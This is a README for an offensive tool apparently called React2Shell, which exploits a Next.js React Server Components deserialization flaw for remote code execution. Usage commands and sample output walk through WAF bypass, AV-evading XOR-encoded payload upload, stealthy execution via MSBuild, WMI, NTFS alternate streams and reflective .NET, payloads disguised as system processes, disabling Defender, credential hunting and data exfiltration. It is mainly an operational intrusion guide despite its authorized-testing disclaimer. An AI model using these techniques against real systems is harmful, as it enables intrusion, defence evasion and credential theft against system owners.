# React2Shell Advanced v5

Advanced exploitation framework for **CVE-2025-55182** — Remote Code Execution in Next.js React Server Components via insecure deserialization in the Flight protocol.

> ⚠️ **For authorized security testing and CTF challenges only.**

## Features

### Exploitation
- **Dual Payload Strategies** — Strategy A (3-part) and Strategy B (5-part lachlan2k variant)
- **Safe Probe** — Non-RCE vulnerability detection without executing code
- **Auto-Escalation** — Tries 30 combinations of strategy × bypass × exfil automatically
- **OS Auto-Detection** — Detects Windows vs Linux targets and adapts commands

### WAF Bypass
- 6 bypass presets (`none`, `light`, `medium`, `generic`, `heavy`, `aggressive`)
- Unicode JSON escaping, multipart manipulation, JS obfuscation
- Custom Host header for reverse-proxy bypass (`-H domain`)

### Evasive Upload Pipeline (v5)
- **XOR Encryption** — All file bytes XOR'd with random key (eliminates PE signatures)
- **Base64 Encoding** — XOR'd bytes base64-encoded for text-safe transfer
- **Chunked Upload** — 7.5KB chunks via PowerShell `Set-Content`/`Add-Content`
- **Zero Signature** — `.tmp` file on disk is undetectable by any AV
- **Metadata Storage** — XOR key + path stored for automatic execution

### Evasive Execution Arsenal (v5) — 6 Methods

| Command | Method | How It Works | Best For |
|---------|--------|--------------|----------|
| `.rundecode name` | **PS Decode + WMI** | PowerShell decodes in background, WMI launches (parent=WmiPrvSE.exe) | **Most reliable — use this first** |
| `.run name` | **Smart Auto** | Tries all 5 methods below automatically | When you want to try everything |
| `.runmsbuild name` | **MSBuild LOLBIN** | Writes .csproj with inline C#, MSBuild.exe compiles+executes | When MSBuild is available |
| `.runwmi name` | **WMI + Node.js** | Node.js decodes, wmic launches (parent=WmiPrvSE.exe) | When Node.js is available |
| `.runads name` | **ADS Stream** | Decodes into NTFS Alternate Data Stream, executes from ADS | When Defender skips ADS |
| `.runmem name` | **Reflective .NET** | Decodes in memory, Assembly.Load() — zero disk write | When binary is .NET assembly |
| `.runraw t k` | **Manual** | Specify .tmp path and XOR key manually | When upload metadata is lost |

### Upload Format
```
Original Binary → XOR(key) → Base64 → .tmp file on target
                                         (text, undetectable)

Correct Decode:  ReadAllText → FromBase64String → XOR(key) → WriteAllBytes
                 (text)         (binary bytes)     (decrypt)   (valid PE)
```

### Post-Exploitation Enumeration
- **`.info`** / **`.fullinfo`** — Quick / comprehensive system enumeration
- **`.users`** / **`.ps`** / **`.net`** / **`.services`** / **`.shares`** / **`.firewall`**
- **`.secrets`** — Credential hunting (env vars, SSH keys, SAM, `.env`)
- **`.persist`** — Persistence check (scheduled tasks, SUID, cron)
- **`.software`** — Installed software, patches, runtimes

### AV/Defender Management
- **`.av`** — Full AV status, exclusions, recent threat detections
- **`.avoff`** — Disable Defender real-time monitoring (needs admin)
- **`.exclude path`** — Add Defender exclusion path (needs admin)

## Installation

```bash
pip install requests
```

## Quick Start

```bash
# Interactive shell
python3 react2shell_advanced.py -u https://target.com

# Safe vulnerability check (no code execution)
python3 react2shell_advanced.py -u https://target.com --safeprobe

# Full auto-escalation
python3 react2shell_advanced.py -u https://target.com --auto-pwn

# Single command
python3 react2shell_advanced.py -u https://target.com -c "whoami"

# Custom Host header (bypass WAF)
python3 react2shell_advanced.py -u http://1.2.3.4:3000 -H target.com
```

## Step-by-Step: Upload & Execute a Payload

### Step 1: Upload
```bash
user@target$ .upload /path/to/payload.exe C:\Windows\Tasks
```
Output:
```
[*] Uploading payload.exe → C:/Windows/Tasks/payload.exe (1782272B, 317 chunks, XOR key=0xA5)
  [100%] Chunk 317/317 (766s)
[+] Upload complete: C:/Windows/Tasks/payload.exe.tmp (2376364B b64, XOR=0xA5)
  Execute with: .run payload.exe
```

### Step 2: Execute (choose one)

**Option A — `.rundecode` (recommended, most reliable):**
```bash
user@target$ .rundecode payload.exe
```
This does:
1. Background PowerShell decode: `ReadAllText → Base64 → XOR → WriteAllBytes`
2. Polls until decoded file appears with correct size
3. Auto-launches via WMI (`wmic process call create`)
4. Output filename auto-picked from: svchost, winlogon, services, lsass, csrss

**Option B — `.run` (smart auto, tries all 5 methods):**
```bash
user@target$ .run payload.exe
```
Tries: MSBuild → WMI → ADS → Reflective .NET → Node.js

**Option C — Specific method:**
```bash
user@target$ .runmsbuild payload.exe    # MSBuild LOLBIN
user@target$ .runwmi payload.exe        # WMI + Node.js decode
user@target$ .runads payload.exe        # NTFS ADS hidden stream
user@target$ .runmem payload.exe        # Reflective .NET (memory only)
```

**Option D — Manual (if metadata lost):**
```bash
user@target$ .runraw C:/Windows/Tasks/payload.exe.tmp A5
```

### Step 3: Verify
```bash
user@target$ tasklist | findstr svchost
```

### Step 4: Clean Up
```bash
user@target$ del C:\Windows\Tasks\payload.exe.tmp
user@target$ del C:\Windows\Tasks\svchost.exe
```

## Execution Methods Explained

### `.rundecode` — PowerShell Decode + WMI Launch
The most reliable method. Uses PowerShell's `[Convert]::FromBase64String()` to decode and XOR decrypt. Runs in background to avoid webshell timeout. WMI launch creates the process under `WmiPrvSE.exe` (trusted parent).

### `.runmsbuild` — MSBuild LOLBIN (T1127.001)
Writes a `.csproj` XML file containing inline C# code. MSBuild.exe (signed Microsoft binary) compiles and executes it. The C# code reads the .tmp, base64 decodes, XOR decrypts, writes the binary, and starts it. No PowerShell = no AMSI scanning.

### `.runwmi` — WMI Process Chain (T1047)
Node.js decodes the .tmp to a .scr file (bypasses AMSI since Node.js isn't hooked). Then `wmic process call create` launches it with WmiPrvSE.exe as parent — breaking the C2 process chain.

### `.runads` — Alternate Data Stream (T1564.004)
Decodes the binary into an NTFS ADS (e.g., `update.log:svc.exe`). The binary is hidden from `dir` and most AV scanners. Execution from ADS often bypasses Defender's file monitoring.

### `.runmem` — Reflective .NET Assembly (T1620)
Zero disk write. Reads .tmp, base64 decodes, XOR decrypts entirely in PowerShell memory. Uses `[Reflection.Assembly]::Load()` to load the .NET assembly and invokes `Main()`. Only works for .NET binaries (auto-detects and skips if not .NET).

## Shell Commands Reference

### Exploit Controls
| Command | Description |
|---------|-------------|
| `.safeprobe` | Non-RCE vulnerability check |
| `.auto [cmd]` | Auto-escalate through all combos |
| `.strategy A\|B` | Switch payload variant |
| `.exfil [ch]` | Switch exfil channel |
| `.bypass [preset]` | WAF bypass preset |
| `.obf N` | JS obfuscation level (0–4) |
| `.jsonesc N` | Unicode JSON escaping (0–2) |
| `.host domain` | Set custom Host header |

### Post-Exploitation
| Command | Description |
|---------|-------------|
| `.info` | Quick system enumeration |
| `.fullinfo` | Full enumeration (all modules) |
| `.users` / `.ps` / `.net` | Users, processes, network |
| `.services` / `.shares` | Services, network shares |
| `.firewall` / `.secrets` | Firewall rules, credentials |
| `.persist` / `.software` | Persistence, installed software |

### File Operations
| Command | Description |
|---------|-------------|
| `.upload local remote` | Evasive upload (XOR + b64 + chunked) |
| `.download remote` | Download file from target |
| `.cat path` | Read file content |

### Execution
| Command | Description |
|---------|-------------|
| `.rundecode name [out.exe]` | **PS decode + WMI launch (recommended)** |
| `.run name [args]` | Smart auto (tries all 5 methods) |
| `.runmsbuild name` | MSBuild LOLBIN execution |
| `.runwmi name` | WMI + Node.js execution |
| `.runads name` | ADS stream execution |
| `.runmem name` | Reflective .NET memory load |
| `.runraw path key` | Manual XOR key execution |
| `.exec path [args]` | Direct exe launcher (5+ methods) |
| `.bg cmd` | Background execution |
| `.kill pid\|name` | Kill process |

### AV/Defender
| Command | Description |
|---------|-------------|
| `.av` | AV status, exclusions, threats |
| `.avoff` | Disable Defender RT (admin) |
| `.exclude path` | Add AV exclusion (admin) |

## CLI Options

```
-u, --url           Target URL (required)
-c, --command       Execute single command
-H, --host          Custom Host header
--strategy A|B      Payload variant
--bypass PRESET     WAF bypass preset
--exfil CHANNEL     Exfiltration method
-o, --obfuscate N   JS obfuscation level (0-4)
-j, --json-escape N Unicode JSON escaping (0-2)
--stealth           Stealth mode (random UA, delays)
--callback-url URL  Callback URL for OOB exfil
--dns-domain DOM    Domain for DNS exfil
--proxy URL         HTTP proxy
--timeout N         Request timeout (default: 90s)
--debug             Debug output
--auto-pwn          Full auto-escalation
--safeprobe         Non-RCE vulnerability check
```

## Disclaimer

This tool is intended for **authorized penetration testing** and **CTF competitions** only. Unauthorized access to computer systems is illegal. The authors are not responsible for misuse.
